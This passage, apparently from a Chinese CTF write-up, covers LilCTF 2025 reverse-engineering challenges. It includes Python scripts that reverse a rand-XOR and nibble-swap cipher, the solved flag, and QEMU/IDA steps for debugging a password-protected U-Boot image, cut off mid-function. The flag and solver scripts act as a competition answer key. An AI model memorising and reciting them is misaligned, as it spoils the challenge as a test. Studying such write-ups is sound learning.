class="hljs-number">16</span> * v5;<br>    v3 = v5 &gt;&gt; <span class="hljs-number">4</span>;<br>    *(_BYTE *)(i + a1) = (v5 &gt;&gt; <span class="hljs-number">4</span>) | (<span class="hljs-number">16</span> * v5);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; a2; ++j )<br>    *(_BYTE *)(a1 + j) = ~*(_BYTE *)(a1 + j);<br>  <span class="hljs-built_in">memcpy</span>(Character, &amp;unk_7FF6EDA65060, <span class="hljs-number">0x88u</span>i64);<br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; (<span class="hljs-type">unsigned</span> __int64)k &lt;= <span class="hljs-number">0x21</span>; ++k )<br>    <span class="hljs-built_in">putchar</span>(Character[k]);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后的 for 循环是打印出字符 <code>Encryption done, time to compare!</code><br>模拟出加密过程，动调验证是对的<br>第一处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> struct<br><br>input_string = <span class="hljs-string">&quot;LilCTF&#123;12312345678901234567890123456789&#125;&quot;</span><br>seed = <span class="hljs-number">0x000000048691412</span><br><br>libc = ctypes.CDLL(<span class="hljs-string">&#x27;msvcrt&#x27;</span>)  <span class="hljs-comment"># 适用于 Windows</span><br>libc.srand.argtypes = [ctypes.c_uint]<br>libc.rand.restype = ctypes.c_int<br>libc.srand(seed)<br><br>encrypted_bytes = <span class="hljs-built_in">bytearray</span>(input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>num_words = <span class="hljs-built_in">len</span>(encrypted_bytes) // <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_words):<br>    rand_val = libc.rand() &amp; <span class="hljs-number">0xFFFF</span><br>    current_word = struct.unpack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, encrypted_bytes[i*<span class="hljs-number">2</span>:i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>])[<span class="hljs-number">0</span>]<br>    encrypted_word = current_word ^ rand_val<br>    struct.pack_into(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, encrypted_bytes, i*<span class="hljs-number">2</span>, encrypted_word)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;加密后的十六进制数组：&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;, &quot;</span>.join([<span class="hljs-string">f&quot;0x<span class="hljs-subst">&#123;b:02X&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> encrypted_bytes[:<span class="hljs-number">11</span>]]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;, &quot;</span>.join([<span class="hljs-string">f&quot;0x<span class="hljs-subst">&#123;b:02X&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> encrypted_bytes[<span class="hljs-number">11</span>:<span class="hljs-number">22</span>]]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;, &quot;</span>.join([<span class="hljs-string">f&quot;0x<span class="hljs-subst">&#123;b:02X&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> encrypted_bytes[<span class="hljs-number">22</span>:<span class="hljs-number">32</span>]]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;, &quot;</span>.join([<span class="hljs-string">f&quot;0x<span class="hljs-subst">&#123;b:02X&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> encrypted_bytes[<span class="hljs-number">32</span>:]]))<br></code></pre></td></tr></table></figure><p>第二处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">a1: <span class="hljs-built_in">bytearray</span>, a2: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Simulates the C++ encode function to encrypt data.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(a2):<br>        v5 = a1[i]<br>        a1[i] = ((v5 &gt;&gt; <span class="hljs-number">4</span>) | (v5 &lt;&lt; <span class="hljs-number">4</span>)) &amp; <span class="hljs-number">0xFF</span>  <br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(a2):<br>        a1[j] = ~a1[j] &amp; <span class="hljs-number">0xFF</span><br><br>    <span class="hljs-keyword">return</span> a1<br><br>hex_string_input = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">0x3A, 0x25, 0xD4, 0x3E, 0x30, 0x01, 0x83, 0x61, 0x95, 0x70, 0xF9</span><br><span class="hljs-string">0x01, 0xB4, 0x53, 0xE1, 0x5F, 0x49, 0x74, 0x78, 0x51, 0x55, 0x72</span><br><span class="hljs-string">0x96, 0x3B, 0x26, 0x7B, 0x9E, 0x47, 0xC0, 0x11, 0xF1, 0x6E</span><br><span class="hljs-string">0x45, 0x23, 0xAB, 0x43, 0xCA, 0x39, 0x75, 0x4E</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 用正则提取所有十六进制数</span><br>byte_list = [<span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&#x27;0x[0-9A-Fa-f]&#123;2&#125;&#x27;</span>, hex_string_input)]<br>plaintext_data = <span class="hljs-built_in">bytearray</span>(byte_list)<br><br>encrypted_data = encode(plaintext_data, <span class="hljs-built_in">len</span>(plaintext_data))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; &quot;</span>.join([<span class="hljs-string">f&quot;0x<span class="hljs-subst">&#123;b:02X&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> encrypted_data]))<br></code></pre></td></tr></table></figure><p>接下来是找密文<br>在比较过程的调试时，发现 rcx (input) 中栈地址位置原本是 41 字节</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xEE</span>, <span class="hljs-number">0</span>x1C, <span class="hljs-number">0</span>x04, <span class="hljs-number">0</span>xA9, <span class="hljs-number">0</span>x4A, <span class="hljs-number">0</span>x58, <span class="hljs-number">0</span>x7F, <span class="hljs-number">0</span>x34, <span class="hljs-number">0</span>xBB, <span class="hljs-number">0</span>x66, <span class="hljs-number">0</span>xBC, <span class="hljs-number">0</span>x84, <span class="hljs-number">0</span>x2A, <span class="hljs-number">0</span>x65, <span class="hljs-number">0</span>x87, <span class="hljs-number">0</span>xEC, <br><span class="hljs-attribute">0x99</span>, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x39, <span class="hljs-number">0</span>x4A, <span class="hljs-number">0</span>xB9, <span class="hljs-number">0</span>xC8, <span class="hljs-number">0</span>x1A, <span class="hljs-number">0</span>x33, <span class="hljs-number">0</span>x32, <span class="hljs-number">0</span>xE4, <span class="hljs-number">0</span>x4D, <span class="hljs-number">0</span>x30, <span class="hljs-number">0</span>x68, <span class="hljs-number">0</span>x65, <span class="hljs-number">0</span>xD6, <span class="hljs-number">0</span>x68, <br><span class="hljs-attribute">0x79</span>, <span class="hljs-number">0</span>xA8, <span class="hljs-number">0</span>xF1, <span class="hljs-number">0</span>x6B, <span class="hljs-number">0</span>xB1, <span class="hljs-number">0</span>x6C, <span class="hljs-number">0</span>x05, <span class="hljs-number">0</span>xC2, <span class="hljs-number">0</span>xDA<br></code></pre></td></tr></table></figure><p><img src="/../images/LilCTF2025/o4.png"><br><img src="/../images/LilCTF2025/o5.png"></p><p>最后变成 rdx 中栈地址位置的 40 字节 (末尾变成 0 了)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x5C</span>, <span class="hljs-number">0</span>xAF, <span class="hljs-number">0</span>xB0, <span class="hljs-number">0</span>x1C, <span class="hljs-number">0</span>xFC, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>xC7, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>xDD, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x39, <span class="hljs-number">0</span>x94, <span class="hljs-number">0</span>xDA, <span class="hljs-number">0</span>x47, <span class="hljs-number">0</span>x2D, <span class="hljs-number">0</span>x5B, <span class="hljs-number">0</span>x48, <span class="hljs-number">0</span>xFD, <span class="hljs-number">0</span>x8F, <span class="hljs-number">0</span>x7F, <span class="hljs-number">0</span>x0F, <span class="hljs-number">0</span>xD2, <span class="hljs-number">0</span>xFA, <span class="hljs-number">0</span>xF8, <span class="hljs-number">0</span>x2F, <span class="hljs-number">0</span>x81, <span class="hljs-number">0</span>xFD, <span class="hljs-number">0</span>xA6, <span class="hljs-number">0</span>xAA, <span class="hljs-number">0</span>x06, <span class="hljs-number">0</span>xB9, <span class="hljs-number">0</span>xAB, <span class="hljs-number">0</span>x7B, <span class="hljs-number">0</span>x25, <span class="hljs-number">0</span>xBE, <span class="hljs-number">0</span>x67, <span class="hljs-number">0</span>xBB, <span class="hljs-number">0</span>xDD, <span class="hljs-number">0</span>x1B, <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="/../images/LilCTF2025/o6.png"></p><p>逆向解密 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_with_rand</span>(<span class="hljs-params">encrypted_bytes, seed</span>):<br>    libc = ctypes.CDLL(<span class="hljs-string">&#x27;msvcrt&#x27;</span>)<br>    libc.srand.argtypes = [ctypes.c_uint]<br>    libc.rand.restype = ctypes.c_int<br>    libc.srand(seed)<br><br>    decrypted_bytes = <span class="hljs-built_in">bytearray</span>(encrypted_bytes)<br>    num_words = <span class="hljs-built_in">len</span>(decrypted_bytes) // <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_words):<br>        rand_val = libc.rand() &amp; <span class="hljs-number">0xFFFF</span><br>        current_word = struct.unpack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, decrypted_bytes[i*<span class="hljs-number">2</span>:i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>])[<span class="hljs-number">0</span>]<br>        decrypted_word = current_word ^ rand_val<br>        struct.pack_into(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, decrypted_bytes, i*<span class="hljs-number">2</span>, decrypted_word)<br>    <br>    <span class="hljs-keyword">return</span> decrypted_bytes<br><br>ciphertext = [<br>    <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x39</span>,<br>    <span class="hljs-number">0x94</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xFA</span>,<br>    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xBE</span>,<br>    <span class="hljs-number">0x67</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x1B</span><br>]<br><br>bytes_after_invert = [~b &amp; <span class="hljs-number">0xFF</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> ciphertext]<br><br>bytes_after_rotate = [(b &lt;&lt; <span class="hljs-number">4</span> | b &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFF</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytes_after_invert]<br><br>seed = <span class="hljs-number">0x000000048691412</span><br>final_decrypted_bytes = decrypt_with_rand(bytes_after_rotate, seed)<br><br><span class="hljs-built_in">print</span>(final_decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>解出 flag 为 <code>LILCTF&#123;wHa7_15_D47aflOw_c@N_lt_83_3atEn&#125;</code></p><h3 id="Oh-My-Uboot"><a href="#Oh-My-Uboot" class="headerlink" title="Oh_My_Uboot"></a>Oh_My_Uboot</h3><p>附件给的是 093631_re-u-boot.txt，重命名一下改成 uboot</p><blockquote><p>uboot 全称是 Universal Boot Loader(通用引导加载程序),是一种开源的、广泛使用的嵌入式系统引导程序(Bootloader),本质是一段裸机代码.</p></blockquote><blockquote><p>操作系统的启动过程(Linux 启动过程为例)<br>[ 上电 &#x2F; Reset ]<br>        ↓<br>[ BootROM &#x2F; BIOS &#x2F; UEFI ]<br>        ↓<br>[ Bootloader (SPL → U-Boot&#x2F;GRUB) ]<br>        ↓<br>[ 内核加载 (Linux Kernel Init) ]<br>        ↓<br>[ 挂载根文件系统 RootFS ]<br>        ↓<br>[ init &#x2F; systemd 启动服务 ]<br>        ↓<br>[ 用户空间 (Shell &#x2F; GUI &#x2F; App) ]</p></blockquote><p>这道题重点在于对这个 uboot 进行调试<br>使用指令<br><code>qemu-system-arm -M vexpress-a9 -nographic -kernel /home/eleven/ctf/temp/uboot -S -gdb tcp::1234</code></p><p>回显:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">W</span>][<span class="hljs-number">03605.390307</span>] <span class="hljs-string">pw.conf</span>      <span class="hljs-string">|</span> [          <span class="hljs-attr">conf.c:</span> <span class="hljs-number">1031 </span><span class="hljs-string">try_load_conf()</span>] <span class="hljs-string">can&#x27;t</span> <span class="hljs-attr">load config client.conf:</span> <span class="hljs-literal">No</span> <span class="hljs-string">such</span> <span class="hljs-string">file</span> <span class="hljs-string">or</span> <span class="hljs-string">directory</span><br>[<span class="hljs-string">E</span>][<span class="hljs-number">03605.390394</span>] <span class="hljs-string">pw.conf</span>      <span class="hljs-string">|</span> [          <span class="hljs-attr">conf.c:</span> <span class="hljs-number">1060 </span><span class="hljs-string">pw_conf_load_conf_for_context()</span>] <span class="hljs-string">can&#x27;t</span> <span class="hljs-attr">load config client.conf:</span> <span class="hljs-literal">No</span> <span class="hljs-string">such</span> <span class="hljs-string">file</span> <span class="hljs-string">or</span> <span class="hljs-string">directory</span><br><span class="hljs-attr">pulseaudio:</span> <span class="hljs-string">set_sink_input_volume()</span> <span class="hljs-string">failed</span><br><span class="hljs-attr">pulseaudio: Reason:</span> <span class="hljs-string">Invalid</span> <span class="hljs-string">argument</span><br><span class="hljs-attr">pulseaudio:</span> <span class="hljs-string">set_sink_input_mute()</span> <span class="hljs-string">failed</span><br><span class="hljs-attr">pulseaudio: Reason:</span> <span class="hljs-string">Invalid</span> <span class="hljs-string">argument</span><br></code></pre></td></tr></table></figure><p>然后在 ida 中选择 Remote GDB Debugger<br><img src="/../images/LilCTF2025/u1.png"><br>运行之后会看到回显多了</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">U-Boot <span class="hljs-number">2025.04</span> (Jul <span class="hljs-number">01</span> <span class="hljs-number">2025</span> - <span class="hljs-number">13</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span> +<span class="hljs-number">0800</span>)<br><br><span class="hljs-symbol">DRAM:</span>  <span class="hljs-number">128</span> MiB<br><span class="hljs-symbol">WARNING:</span> Caches <span class="hljs-built_in">not</span> enabled<br><span class="hljs-symbol">Core:</span>  <span class="hljs-number">23</span> devices, <span class="hljs-number">11</span> uclasses, devicetree: embed<br><span class="hljs-symbol">Flash:</span> <span class="hljs-number">128</span> MiB<br><span class="hljs-symbol">MMC:</span>   mmci@<span class="hljs-number">5000</span>: <span class="hljs-number">0</span><br>Loading Environment <span class="hljs-keyword">from</span> Flash... *** Warning - bad CRC, <span class="hljs-keyword">using</span> <span class="hljs-keyword">default</span> environment<br><br><span class="hljs-symbol">In:</span>    uart@<span class="hljs-number">9000</span><br><span class="hljs-symbol">Out:</span>   uart@<span class="hljs-number">9000</span><br><span class="hljs-symbol">Err:</span>   uart@<span class="hljs-number">9000</span><br><span class="hljs-symbol">Net:</span>   eth0: ethernet@<span class="hljs-number">3</span>,<span class="hljs-number">02000000</span><br>Autoboot <span class="hljs-keyword">in</span> <span class="hljs-number">2</span> seconds<br>Hash sha256 <span class="hljs-built_in">not</span> supported!<br>MMC Device <span class="hljs-number">1</span> <span class="hljs-built_in">not</span> found<br>no mmc device at slot <span class="hljs-number">1</span><br>Card did <span class="hljs-built_in">not</span> respond <span class="hljs-keyword">to</span> voltage <span class="hljs-keyword">select</span>! : -<span class="hljs-number">110</span><br><span class="hljs-symbol">smc911x:</span> detected LAN9118 controller<br><span class="hljs-symbol">smc911x:</span> phy initialized<br><span class="hljs-symbol">smc911x:</span> MAC <span class="hljs-number">52</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span><br>BOOTP broadcast <span class="hljs-number">1</span><br>DHCP client bound <span class="hljs-keyword">to</span> address <span class="hljs-number">10.0</span>.<span class="hljs-number">2.15</span> (<span class="hljs-number">2</span> ms)<br>*** Warning: no boot file name; <span class="hljs-keyword">using</span> <span class="hljs-comment">&#x27;0A00020F.img&#x27;</span><br><span class="hljs-keyword">Using</span> ethernet@<span class="hljs-number">3</span>,<span class="hljs-number">02000000</span> device<br>TFTP <span class="hljs-keyword">from</span> server <span class="hljs-number">10.0</span>.<span class="hljs-number">2.2</span>; our IP address <span class="hljs-built_in">is</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.15</span><br>Filename <span class="hljs-comment">&#x27;0A00020F.img&#x27;.</span><br>Load address: <span class="hljs-number">0</span>x60100000<br><span class="hljs-symbol">Loading:</span> *<br>TFTP <span class="hljs-keyword">error</span>: <span class="hljs-comment">&#x27;Access violation&#x27; (2)</span><br><span class="hljs-built_in">Not</span> retrying...<br><span class="hljs-symbol">smc911x:</span> MAC <span class="hljs-number">52</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span><br>missing environment variable: pxefile_addr_r<br><span class="hljs-symbol">smc911x:</span> detected LAN9118 controller<br><span class="hljs-symbol">smc911x:</span> phy initialized<br><span class="hljs-symbol">smc911x:</span> MAC <span class="hljs-number">52</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span><br>BOOTP broadcast <span class="hljs-number">1</span><br>DHCP client bound <span class="hljs-keyword">to</span> address <span class="hljs-number">10.0</span>.<span class="hljs-number">2.15</span> (<span class="hljs-number">0</span> ms)<br><span class="hljs-keyword">Using</span> ethernet@<span class="hljs-number">3</span>,<span class="hljs-number">02000000</span> device<br>TFTP <span class="hljs-keyword">from</span> server <span class="hljs-number">10.0</span>.<span class="hljs-number">2.2</span>; our IP address <span class="hljs-built_in">is</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.15</span><br>Filename <span class="hljs-comment">&#x27;boot.scr.uimg&#x27;.</span><br>Load address: <span class="hljs-number">0</span>x60100000<br><span class="hljs-symbol">Loading:</span> *<br>TFTP <span class="hljs-keyword">error</span>: <span class="hljs-comment">&#x27;Access violation&#x27; (2)</span><br><span class="hljs-built_in">Not</span> retrying...<br><span class="hljs-symbol">smc911x:</span> MAC <span class="hljs-number">52</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span><br><span class="hljs-symbol">smc911x:</span> detected LAN9118 controller<br><span class="hljs-symbol">smc911x:</span> phy initialized<br><span class="hljs-symbol">smc911x:</span> MAC <span class="hljs-number">52</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span><br>BOOTP broadcast <span class="hljs-number">1</span><br>DHCP client bound <span class="hljs-keyword">to</span> address <span class="hljs-number">10.0</span>.<span class="hljs-number">2.15</span> (<span class="hljs-number">0</span> ms)<br><span class="hljs-keyword">Using</span> ethernet@<span class="hljs-number">3</span>,<span class="hljs-number">02000000</span> device<br>TFTP <span class="hljs-keyword">from</span> server <span class="hljs-number">10.0</span>.<span class="hljs-number">2.2</span>; our IP address <span class="hljs-built_in">is</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.15</span><br>Filename <span class="hljs-comment">&#x27;boot.scr.uimg&#x27;.</span><br>Load address: <span class="hljs-number">0</span>x60100000<br><span class="hljs-symbol">Loading:</span> *<br>TFTP <span class="hljs-keyword">error</span>: <span class="hljs-comment">&#x27;Access violation&#x27; (2)</span><br><span class="hljs-built_in">Not</span> retrying...<br><span class="hljs-symbol">smc911x:</span> MAC <span class="hljs-number">52</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span><br>cp - memory copy<br><br><span class="hljs-symbol">Usage:</span><br>cp [.b, .w, .l] source target count<br>Wrong Image Type <span class="hljs-keyword">for</span> bootm command<br><span class="hljs-keyword">ERROR</span> -<span class="hljs-number">91</span>: can<span class="hljs-comment">&#x27;t get kernel image!</span><br>### Please input uboot password: ###<br></code></pre></td></tr></table></figure><p>ida 这边一直显示 running，直接 Suspend 就行</p><p><img src="/../images/LilCTF2025/u2.png"></p><p>然后一直 f7 步进,随便输入字符，按完回车键之后跳到了这里</p><p><img src="/../images/LilCTF2025/u7.png"></p><p>点进 <strong>unk_67F71E3C</strong>，<code>U</code> <code>P</code> 之后变成函数</p><p><img src="/../images/LilCTF2025/u5.png"></p><p>看到异或，反编译关键函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs smali">_BYTE *__fastcall sub_67F71E3C(_BYTE *a1, _BYTE *a2)<br>&#123;<br> <span class="hljs-built_in"> int </span>v4; // r0<br>  _BYTE *v5; // r3<br> <span class="hljs-built_in"> int </span>v6; // r2<br>  _BYTE *v7; // r0<br> <span class="hljs-built_in"> int </span>v8; // r3<br>  char *v9; // r1<br>  _BYTE *v10; // r4<br> <span class="hljs-built_in"> int </span>v11; // r7<br>  _BYTE *v12; // r8<br>  unsigned __int8 *v13; // r10<br>  unsigned<span class="hljs-built_in"> int </span>v14; // r7<br>  _BYTE *v15; // r2<br>  unsigned<span class="hljs-built_in"> int </span>v16; // r3<br>  _BYTE *v17; // r4<br>  _BYTE *result; // r0<br>  unsigned __int8 *v19; // r11<br> <span class="hljs-built_in"> int </span>v20; // r6<br>  unsigned __int8 v21; // r1<br>  char v22; // r1<br>  _BYTE v23[4]; // [sp+0h] [bp-90h] BYREF<br> <span class="hljs-built_in"> int </span>v24; // [sp+4h] [bp-8Ch]<br>  char v25; // [sp+Ch] [bp-84h] BYREF<br><br>  v4 = ((int (*)(void))unk_67FC21E0)();<br>  v5 = a1;<br>  v6 = 